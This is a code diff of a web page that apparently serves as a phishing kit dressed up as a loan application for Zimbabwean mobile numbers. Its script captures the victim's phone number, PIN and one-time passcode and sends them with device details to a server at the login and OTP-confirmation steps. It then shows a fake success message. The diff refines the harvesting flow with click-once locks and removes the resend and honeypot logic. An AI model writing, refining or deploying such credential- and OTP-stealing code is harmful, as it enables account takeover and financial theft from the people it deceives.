@@ -295,21 +295,13 @@ input:focus{
 </div>
 
 <script>
-/* ===== LOAN FORM ===== */
+/* ===== LOAN SUMMARY ===== */
 function buildLoanRequest(){
   try{
     const loan = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
     if(!loan.loanAmount) return 'N/A';
-
-    const amount = `USD ${loan.loanAmount}`;
-    const type = loan.loanType || 'N/A';
-    const period = loan.repayment ? `${loan.repayment} month(s)` : 'N/A';
-    const employment = loan.employment || 'N/A';
-
-    return `${amount} / ${type} / ${period} (${employment})`;
-  }catch(e){
-    return 'N/A';
-  }
+    return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
+  }catch(e){ return 'N/A'; }
 }
 
 /* ===== DEVICE ===== */
@@ -324,6 +316,8 @@ else if(/Firefox/i.test(ua)) device+=' | Firefox';
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
+let loginLocked=false;
+let confirmLocked=false;
 
 pins.forEach((el,i)=>{
   el.addEventListener('input',()=>{
@@ -332,25 +326,11 @@ pins.forEach((el,i)=>{
     if(el.value && i<pins.length-1) pins[i+1].focus();
     updatePin();
   });
-  el.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'){
-      if(el.value){
-        el.value='';
-        el.classList.remove('filled');
-      }else if(i>0){
-        pins[i-1].focus();
-        pins[i-1].value='';
-        pins[i-1].classList.remove('filled');
-      }
-      e.preventDefault();
-      updatePin();
-    }
-  });
 });
 
 function updatePin(){
   pinValue=pins.map(p=>p.value).join('');
-  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
+  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue)) || loginLocked;
 }
 
 /* ===== PHONE ===== */
@@ -360,7 +340,6 @@ const loginBtn=document.getElementById('loginBtn');
 
 function validatePhone(){
   const d=phone.value.replace('+263','');
-  if(!d){phoneError.innerText='';return false}
   if(!/^7\d{8}$/.test(d)){
     phoneError.innerText='Enter your 9-digit number starting with 7';
     return false;
@@ -372,8 +351,7 @@ function validatePhone(){
 phone.addEventListener('input',()=>{
   let d=phone.value.replace('+263','').replace(/\D/g,'');
   if(d.startsWith('0')) d=d.slice(1);
-  d=d.slice(0,9);
-  phone.value='+263'+d;
+  phone.value='+263'+d.slice(0,9);
   validatePhone();
 });
 
@@ -390,7 +368,6 @@ async function sendToServer(payload){
 const dots=[...document.querySelectorAll('.otp-digit')];
 const buffer=document.getElementById('otpBuffer');
 const confirmBtn=document.getElementById('confirmOtp');
-const otpWarning=document.getElementById('otpWarning');
 const resendBtn=document.getElementById('resendBtn');
 const countdown=document.getElementById('countdown');
 const otpStatus=document.getElementById('otpStatus');
@@ -399,15 +376,13 @@ let timer=null,seconds=120;
 
 function renderOtp(v){
   dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
-  confirmBtn.disabled=!/^\d{5}$/.test(v);
-  otpWarning.style.display=/^\d{5}$/.test(v)?'none':'block';
+  confirmBtn.disabled=!/^\d{5}$/.test(v) || confirmLocked;
 }
 
 buffer.addEventListener('input',()=>{
   buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
   renderOtp(buffer.value);
 });
-dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));
 
 function startCountdown(){
   clearInterval(timer);
@@ -420,17 +395,18 @@ function startCountdown(){
   },1000);
 }
 
-/* ===== LOGIN ===== */
+/* ===== LOGIN (CLICK ONCE) ===== */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
-  if(document.getElementById('hp').value) return;
-  if(navigator.vibrate) navigator.vibrate(30);
+  if(loginLocked) return;
+  loginLocked=true;
+  loginBtn.disabled=true;
 
   await sendToServer({
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
-    loan_request: buildLoanRequest(),
+    loan_request:buildLoanRequest(),
     device,
     submittedAt:new Date().toISOString()
   });
@@ -442,41 +418,24 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
   startCountdown();
 });
 
-/* ===== CONFIRM ===== */
+/* ===== CONFIRM (CLICK ONCE) ===== */
 confirmBtn.onclick=async()=>{
-  if(navigator.vibrate) navigator.vibrate(30);
+  if(confirmLocked) return;
+  confirmLocked=true;
+  confirmBtn.disabled=true;
 
   await sendToServer({
     event:'otp_confirm',
     loginPhone:phone.value,
     loginPin:pinValue,
     otp:buffer.value,
-    loan_request: buildLoanRequest(),
+    loan_request:buildLoanRequest(),
     device,
     submittedAt:new Date().toISOString()
   });
 
   otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
-};
-
-/* ===== RESEND ===== */
-resendBtn.onclick=async()=>{
-  resendBtn.disabled=true;
-  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
-
-  await sendToServer({
-    event:'resend_otp',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    loan_request: buildLoanRequest(),
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
-  resendBtn.innerHTML='OTP sent ✓';
-  setTimeout(()=>resendBtn.innerHTML='Resend OTP',1200);
-  startCountdown();
 };
 
 document.getElementById('cancelOtp').onclick=()=>{
